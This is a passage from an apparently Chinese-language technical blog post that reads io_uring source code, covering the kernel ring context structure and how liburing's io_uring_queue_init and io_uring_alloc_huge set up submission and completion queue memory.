class="class"><span class="keyword">struct</span> <span class="title">io_rings</span>*<span class="title">rings</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">percpu_ref</span><span class="title">refs</span>;</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">enum</span> <span class="title">task_work_notify_mode</span><span class="title">notify_method</span>;</span></span><br><span class="line">&#125; ____cacheline_aligned_in_smp;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* submission data */</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">mutex</span><span class="title">uring_lock</span>;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * Ring buffer of indices into array of io_uring_sqe, which is</span></span><br><span class="line"><span class="comment"> * mmapped by the application using the IORING_OFF_SQES offset.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * This indirection could e.g. be used to assign fixed</span></span><br><span class="line"><span class="comment"> * io_uring_sqe entries to operations and only submit them to</span></span><br><span class="line"><span class="comment"> * the queue when needed.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * The kernel modifies neither the indices array nor the entries</span></span><br><span class="line"><span class="comment"> * array.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">u32*sq_array;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">io_uring_sqe</span>*<span class="title">sq_sqes</span>;</span></span><br><span class="line"><span class="type">unsigned</span>cached_sq_head;</span><br><span class="line"><span class="type">unsigned</span>sq_entries;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * Fixed resources fast path, should be accessed only under</span></span><br><span class="line"><span class="comment"> * uring_lock, and updated through io_uring_register(2)</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">io_rsrc_node</span>*<span class="title">rsrc_node</span>;</span></span><br><span class="line"><span class="type">atomic_t</span>cancel_seq;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">io_file_table</span><span class="title">file_table</span>;</span></span><br><span class="line"><span class="type">unsigned</span>nr_user_files;</span><br><span class="line"><span class="type">unsigned</span>nr_user_bufs;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">io_mapped_ubuf</span>**<span class="title">user_bufs</span>;</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">io_submit_state</span><span class="title">submit_state</span>;</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">io_buffer_list</span>*<span class="title">io_bl</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">xarray</span><span class="title">io_bl_xa</span>;</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">io_hash_table</span><span class="title">cancel_table_locked</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">io_alloc_cache</span><span class="title">apoll_cache</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">io_alloc_cache</span><span class="title">netmsg_cache</span>;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * -&gt;iopoll_list is protected by the ctx-&gt;uring_lock for</span></span><br><span class="line"><span class="comment"> * io_uring instances that don&#x27;t use IORING_SETUP_SQPOLL.</span></span><br><span class="line"><span class="comment"> * For SQPOLL, only the single threaded io_sq_thread() will</span></span><br><span class="line"><span class="comment"> * manipulate the list, hence no extra locking is needed there.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">io_wq_work_list</span><span class="title">iopoll_list</span>;</span></span><br><span class="line"><span class="type">bool</span>poll_multi_queue;</span><br><span class="line">&#125; ____cacheline_aligned_in_smp;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * We cache a range of free CQEs we can use, once exhausted it</span></span><br><span class="line"><span class="comment"> * should go through a slower range setup, see __io_get_cqe()</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">io_uring_cqe</span>*<span class="title">cqe_cached</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">io_uring_cqe</span>*<span class="title">cqe_sentinel</span>;</span></span><br><span class="line"></span><br><span class="line"><span class="type">unsigned</span>cached_cq_tail;</span><br><span class="line"><span class="type">unsigned</span>cq_entries;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">io_ev_fd</span>__<span class="title">rcu</span>*<span class="title">io_ev_fd</span>;</span></span><br><span class="line"><span class="type">unsigned</span>cq_extra;</span><br><span class="line">&#125; ____cacheline_aligned_in_smp;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * task_work and async notification delivery cacheline. Expected to</span></span><br><span class="line"><span class="comment"> * regularly bounce b/w CPUs.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">llist_head</span><span class="title">work_llist</span>;</span></span><br><span class="line"><span class="type">unsigned</span> <span class="type">long</span>check_cq;</span><br><span class="line"><span class="type">atomic_t</span>cq_wait_nr;</span><br><span class="line"><span class="type">atomic_t</span>cq_timeouts;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">wait_queue_head</span><span class="title">cq_wait</span>;</span></span><br><span class="line">&#125; ____cacheline_aligned_in_smp;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* timeouts */</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line"><span class="type">spinlock_t</span>timeout_lock;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">list_head</span><span class="title">timeout_list</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">list_head</span><span class="title">ltimeout_list</span>;</span></span><br><span class="line"><span class="type">unsigned</span>cq_last_tm_flush;</span><br><span class="line">&#125; ____cacheline_aligned_in_smp;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">io_uring_cqe</span><span class="title">completion_cqes</span>[16];</span></span><br><span class="line"></span><br><span class="line"><span class="type">spinlock_t</span>completion_lock;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* IRQ completion list, under -&gt;completion_lock */</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">io_wq_work_list</span><span class="title">locked_free_list</span>;</span></span><br><span class="line"><span class="type">unsigned</span> <span class="type">int</span>locked_free_nr;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">list_head</span><span class="title">io_buffers_comp</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">list_head</span><span class="title">cq_overflow_list</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">io_hash_table</span><span class="title">cancel_table</span>;</span></span><br><span class="line"></span><br><span class="line"><span class="type">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">cred</span>*<span class="title">sq_creds</span>;</span><span class="comment">/* cred used for __io_sq_thread() */</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">io_sq_data</span>*<span class="title">sq_data</span>;</span><span class="comment">/* if using sq thread polling */</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">wait_queue_head</span><span class="title">sqo_sq_wait</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">list_head</span><span class="title">sqd_list</span>;</span></span><br><span class="line"></span><br><span class="line"><span class="type">unsigned</span> <span class="type">int</span>file_alloc_start;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">int</span>file_alloc_end;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">xarray</span><span class="title">personalities</span>;</span></span><br><span class="line">u32pers_next;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">list_head</span><span class="title">io_buffers_cache</span>;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* Keep this last, we don&#x27;t need it for the fast path */</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">wait_queue_head</span><span class="title">poll_wq</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">io_restriction</span><span class="title">restrictions</span>;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* slow path rsrc auxilary data, used by update/register */</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">io_mapped_ubuf</span>*<span class="title">dummy_ubuf</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">io_rsrc_data</span>*<span class="title">file_data</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">io_rsrc_data</span>*<span class="title">buf_data</span>;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* protected by -&gt;uring_lock */</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">list_head</span><span class="title">rsrc_ref_list</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">io_alloc_cache</span><span class="title">rsrc_node_cache</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">wait_queue_head</span><span class="title">rsrc_quiesce_wq</span>;</span></span><br><span class="line"><span class="type">unsigned</span>rsrc_quiesce;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">list_head</span><span class="title">io_buffers_pages</span>;</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">if</span> defined(CONFIG_UNIX)</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">socket</span>*<span class="title">ring_sock</span>;</span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"><span class="comment">/* hashed buffered write serialization */</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">io_wq_hash</span>*<span class="title">hash_map</span>;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* Only used for accounting purposes */</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">user_struct</span>*<span class="title">user</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">mm_struct</span>*<span class="title">mm_account</span>;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* ctx exit and cancelation */</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">llist_head</span><span class="title">fallback_llist</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">delayed_work</span><span class="title">fallback_work</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">work_struct</span><span class="title">exit_work</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">list_head</span><span class="title">tctx_list</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">completion</span><span class="title">ref_comp</span>;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* io-wq management, e.g. thread count */</span></span><br><span class="line">u32iowq_limits[<span class="number">2</span>];</span><br><span class="line"><span class="type">bool</span>iowq_limits_set;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">callback_head</span><span class="title">poll_wq_task_work</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">list_head</span><span class="title">defer_list</span>;</span></span><br><span class="line"><span class="type">unsigned</span>sq_thread_idle;</span><br><span class="line"><span class="comment">/* protected by -&gt;completion_lock */</span></span><br><span class="line"><span class="type">unsigned</span>evfd_last_cq_tail;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * If IORING_SETUP_NO_MMAP is used, then the below holds</span></span><br><span class="line"><span class="comment"> * the gup&#x27;ed pages for the two rings, and the sqes.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="type">unsigned</span> <span class="type">short</span>n_ring_pages;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">short</span>n_sqe_pages;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">page</span>**<span class="title">ring_pages</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">page</span>**<span class="title">sqe_pages</span>;</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="liburing-2">liburing</h2><p>liburing 提供的核心接口有如下函数:</p><ul><li><code>io_uring_queue_init</code>  io_uring的初始化结构，用来初始化一个 <code>io_uring</code> 结构体</li><li><code>io_uring_prep_xxx</code>      用来创建一个任务</li><li><code>io_uring_submit</code>          用来提交一个任务</li></ul><h3 id="io-uring-queue-init"><code>io_uring_queue_init</code></h3><p>参数:</p><ul><li>entries: sq队列大小</li><li>rings:     <code>io_uring</code> 结构体,  liburing提供给用户态的管理结构</li><li>flags:     传递给 <code>io_uring_setup</code> 的 <code>params</code>  中的 flag, 用来控制创建的io_uring的特性, 详情可以看  <a href="https://man7.org/linux/man-pages/man2/io_uring_setup.2.html">io_uring_set_up</a><br>返回值:</li><li>fd:           用来mmap的fd</li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">__cold <span class="type">int</span> <span class="title function_">io_uring_queue_init</span><span class="params">(<span class="type">unsigned</span> entries, <span class="keyword">struct</span> io_uring *ring,</span></span><br><span class="line"><span class="params">       <span class="type">unsigned</span> flags)</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">io_uring_params</span> <span class="title">p</span>;</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">memset</span>(&amp;p, <span class="number">0</span>, <span class="keyword">sizeof</span>(p));</span><br><span class="line">p.flags = flags;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> io_uring_queue_init_params(entries, ring, &amp;p);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>接下来是一系列调用链:</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">--&gt;io_uring_queue_init</span><br><span class="line">--&gt;io_uring_queue_init_params</span><br><span class="line">--&gt;io_uring_queue_init_try_nosqarr</span><br><span class="line">--&gt;__io_uring_queue_init_params</span><br></pre></td></tr></table></figure><p>最后到 <code>__io_uring_queue_init_params</code></p><p>其中 p 是要传递给 <code>io_uring_setup</code> 的params,  buf 的使用将在后面分析.</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __io_uring_queue_init_params(<span class="type">unsigned</span> entries, <span class="keyword">struct</span> io_uring *ring,</span><br><span class="line"> <span class="keyword">struct</span> io_uring_params *p, <span class="type">void</span> *buf,</span><br><span class="line"> <span class="type">size_t</span> buf_size)</span><br><span class="line">&#123;</span><br><span class="line"><span class="type">int</span> fd, ret = <span class="number">0</span>;</span><br><span class="line"><span class="type">unsigned</span> *sq_array;</span><br><span class="line"><span class="type">unsigned</span> sq_entries, index;</span><br><span class="line"></span><br><span class="line"><span class="built_in">memset</span>(ring, <span class="number">0</span>, <span class="keyword">sizeof</span>(*ring));</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * The kernel does this check already, but checking it here allows us</span></span><br><span class="line"><span class="comment"> * to avoid handling it below.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">if</span> (p-&gt;flags &amp; IORING_SETUP_REGISTERED_FD_ONLY</span><br><span class="line">    &amp;&amp; !(p-&gt;flags &amp; IORING_SETUP_NO_MMAP))</span><br><span class="line"><span class="keyword">return</span> -EINVAL;</span><br><span class="line"><span class="comment">// 如果设置了REGISTERED_FD_ONLY 就必须要设置 NO_MMAP</span></span><br></pre></td></tr></table></figure><p>对于设置了NO_MMAP的请求，通过 <code>io_uring_alloc_huge</code> 进行了预处理，这个函数我们将在之后[[#io_uring_alloc_huge]]进行分析</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (p-&gt;flags &amp; IORING_SETUP_NO_MMAP) &#123;</span><br><span class="line">ret = io_uring_alloc_huge(entries, p, &amp;ring-&gt;sq, &amp;ring-&gt;cq,</span><br><span class="line">buf, buf_size);</span><br><span class="line"><span class="keyword">if</span> (ret &lt; <span class="number">0</span>)</span><br><span class="line"><span class="keyword">return</span> ret;</span><br><span class="line"><span class="keyword">if</span> (buf)</span><br><span class="line">ring-&gt;int_flags |= INT_FLAG_APP_MEM;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 如果设置了NO_MMAP，就要预先分配大内存</span></span><br></pre></td></tr></table></figure><p>接下来就是调用<code>io_uring_setup</code>  完成真正的初始化操作了。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">fd = __sys_io_uring_setup(entries, p);</span><br><span class="line"><span class="comment">// syscall(__NR_io_uring_setup, entries, p)</span></span><br><span class="line"><span class="keyword">if</span> (fd &lt; <span class="number">0</span>) &#123;</span><br><span class="line"><span class="keyword">if</span> ((p-&gt;flags &amp; IORING_SETUP_NO_MMAP) &amp;&amp;</span><br><span class="line">    !(ring-&gt;int_flags &amp; INT_FLAG_APP_MEM)) &#123;</span><br><span class="line">__sys_munmap(ring-&gt;sq.sqes, <span class="number">1</span>);</span><br><span class="line">io_uring_unmap_rings(&amp;ring-&gt;sq, &amp;ring-&gt;cq);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> fd;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 错误处理</span></span><br></pre></td></tr></table></figure><p>对于没有设置 NO_MMAP 的情形，需要在此时mmap为sq和cq在用户态映射内存[[#io_uring_queue_mmap]]，反之，直接设置ring相关指针[[#io_uring_setup_ring_pointers]]</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (!(p-&gt;flags &amp; IORING_SETUP_NO_MMAP)) &#123;</span><br><span class="line">ret = io_uring_queue_mmap(fd, p, ring);</span><br><span class="line"><span class="keyword">if</span> (ret) &#123;</span><br><span class="line">__sys_close(fd);</span><br><span class="line"><span class="keyword">return</span> ret;</span><br><span class="line">&#125;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">io_uring_setup_ring_pointers(p, &amp;ring-&gt;sq, &amp;ring-&gt;cq);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>之后，是将<code>io_uring_setup</code> 设置在 params 中的各种变量复制到用户态管理结构体ring中。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">sq_entries = ring-&gt;sq.ring_entries;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!(p-&gt;flags &amp; IORING_SETUP_NO_SQARRAY)) &#123;</span><br><span class="line">sq_array = ring-&gt;sq.<span class="built_in">array</span>;</span><br><span class="line"><span class="keyword">for</span> (index = <span class="number">0</span>; index &lt; sq_entries; index++)</span><br><span class="line">sq_array[index] = index;</span><br><span class="line">&#125;</span><br><span class="line">ring-&gt;features = p-&gt;features;</span><br><span class="line"><span class="comment">// io_uring 的 特性</span></span><br><span class="line">ring-&gt;flags = p-&gt;flags;</span><br><span class="line"><span class="comment">// io_uring 设置的标志</span></span><br><span class="line">ring-&gt;enter_ring_fd = fd;</span><br><span class="line"><span class="comment">// 返回的fd</span></span><br><span class="line"><span class="keyword">if</span> (p-&gt;flags &amp; IORING_SETUP_REGISTERED_FD_ONLY) &#123;</span><br><span class="line">ring-&gt;ring_fd = <span class="number">-1</span>;</span><br><span class="line">ring-&gt;int_flags |= INT_FLAG_REG_RING | INT_FLAG_REG_REG_RING;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">ring-&gt;ring_fd = fd;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> ret;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="io-uring-alloc-huge"><code>io_uring_alloc_huge</code></h4><p><code>io_uring_alloc_huge</code> 是对于设置了NO_MMAP的程序，预先在用户态设置好SQ和CQ的内存的函数</p><p>首先是会用到的各种参数和变量</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">int</span> <span class="title function_">io_uring_alloc_huge</span><span class="params">(<span class="type">unsigned</span> entries, <span class="keyword">struct</span> io_uring_params *p,</span></span><br><span class="line"><span class="params">       <span class="keyword">struct</span> io_uring_sq *sq, <span class="keyword">struct</span> io_uring_cq *cq,</span></span><br><span class="line"><span class="params">       <span class="type">void</span> *buf, <span class="type">size_t</span> buf_size)</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">long</span> page_size = get_page_size();</span><br><span class="line"><span class="type">unsigned</span> sq_entries, cq_entries;</span><br><span class="line"><span class="type">size_t</span> ring_mem, sqes_mem;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">long</span> mem_used = <span class="number">0</span>;</span><br><span class="line"><span class="type">void</span> *ptr;</span><br><span class="line"><span class="type">int</span> ret;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>接下来是首先确定了sq和eq entrie的数量。这里具体的算法就不在这里分析了，主要包括合法性检查和幂2向上取整的运算等。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">ret = get_sq_cq_entries(entries, p, &amp;sq_entries, &amp;cq_entries);</span><br><span class="line"><span class="keyword">if</span> (ret)</span><br><span class="line"><span class="keyword">return</span> ret;</span><br></pre></td></tr></table></figure><p>接下来就是计算sq和cq需要的内存大小了，计算过程非常直观，笔者就不赘述了：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">sqes_mem = sq_entries * <span class="keyword">sizeof</span>(<span class="keyword">struct</span> io_uring_sqe);</span><br><span class="line">sqes_mem = (sqes_mem + page_size - <span class="number">1</span>) &amp; ~(page_size - <span class="number">1</span>);</span><br><span class="line">ring_mem = cq_entries * <span class="keyword">sizeof</span>(<span class="keyword">struct</span> io_uring_cqe);</span><br><span class="line"><span class="keyword">if</span> (p-&gt;flags &amp; IORING_SETUP_CQE32)</span><br><span class="line">ring_mem *= <span class="number">2</span>;</span><br><span class="line"><span class="keyword">if</span> (!(p-&gt;flags &amp; IORING_SETUP_NO_SQARRAY))</span><br><span class="line">ring_mem += sq_entries * <span class="keyword">sizeof</span>(<span class="type">unsigned</span>);</span><br><span class="line">mem_used = sqes_mem + ring_mem;</span><br><span class="line">mem_used = (mem_used + page_size - <span class="number">1</span>) &amp; ~(page_size - <span class="number">1</span>);</span><br></pre></td></tr></table></figure><p>接下来，就是真正决定sq和cq的用户态地址了。</p><p>首先，如果用户传入了buf，并且buf_size足够大， 那么就设置为用户buf</p><p>否则，就mmap出一片内存来使用（根据size计算的不同可能是4K也可能是4M，分别是一页和一个大页(二级页表对应的大小)）</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (!buf &amp;&amp; (sqes_mem &gt; huge_page_size || ring_mem &gt; huge_page_size))</span><br><span class="line"><span class="keyword">return</span> -ENOMEM;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (buf) &#123;</span><br><span class="line"><span class="keyword">if</span> (mem_used &gt; buf_size)</span><br><span class="line"><span class="keyword">return</span> -ENOMEM;</span><br><span class="line">ptr = buf;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line"><span class="type">int</span> map_hugetlb = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">if</span> (sqes_mem &lt;= page_size)</span><br><span class="line">buf_size = page_size;</span><br><span class="line"><span class="keyword">else</span> &#123;</span><br><span class="line">buf_size = huge_page_size;</span><br><span class="line">map_hugetlb = MAP_HUGETLB;</span><br><span class="line">&#125;</span><br><span class="line">ptr = __sys_mmap(<span class="literal">NULL</span>, buf_size, PROT_READ|PROT_WRITE,</span><br><span class="line">MAP_SHARED|MAP_ANONYMOUS|map_hugetlb,</span><br><span class="line"><span class="number">-1</span>, <span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span> (IS_ERR(ptr))</span><br><span class="line"><span class="keyword">return</span> PTR_ERR(ptr);</span><br><span class="line">&#125;</span><br><span class="line">sq-&gt;sqes = ptr;</span><br></pre></td></tr></table></figure><p>并以类似的方式设置了<code>sq-&gt;ring_ptr</code></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">if</span> (mem_used &lt;= buf_size)</span><br><span class="line">&#123;</span><br><span class="line">sq-&gt;ring_ptr = (<span class="type">void</span> *)sq-&gt;sqes + sqes_mem;</span><br><span class="line"><span class="comment">/* clear ring sizes, we have just one mmap() to undo */</span></span><br><span class="line">cq-&gt;ring_sz = <span class="number">0</span>;</span><br><span class="line">sq-&gt;ring_sz = <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="type">int</span> map_hugetlb = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">if</span> (ring_mem &lt;= page_size)</span><br><span class="line">buf_size = page_size;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">buf_size = huge_page_size;</span><br><span class="line">map_hugetlb = MAP_HUGETLB;</span><br><span class="line">&#125;</span><br><span class="line">ptr = __sys_mmap(<span class="literal">NULL</span>, buf_size, PROT_READ | PROT_WRITE,</span><br><span class="line"> MAP_SHARED | MAP_ANONYMOUS | map_hugetlb,</span><br><span class="line"> <span class="number">-1</span>, <span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span> (IS_ERR(ptr))</span><br><span 